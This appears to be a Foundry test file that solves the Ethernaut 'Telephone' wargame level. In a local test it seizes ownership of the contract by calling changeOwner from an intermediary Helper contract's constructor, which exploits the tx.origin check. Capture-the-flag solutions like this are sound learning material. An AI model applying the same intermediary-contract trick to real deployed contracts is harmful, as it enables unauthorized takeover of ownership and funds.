// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/Ethernaut/Telephone.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract Helper {
  constructor(address _target, address _newOwner) {
    Telephone(_target).changeOwner(_newOwner);
  }
}

contract TelephoneExploit is Test {
  Telephone target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Telephone();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    address owner = target.owner();
    console2.log('Current owner: %s', owner);
    assertEq(owner, address(deployer));

    vm.startPrank(exploiter);
    new Helper(address(target), address(exploiter));
    vm.stopPrank();

    owner = target.owner();
    console2.log('New owner: %s', owner);
    assertEq(owner, address(exploiter));
  }
}
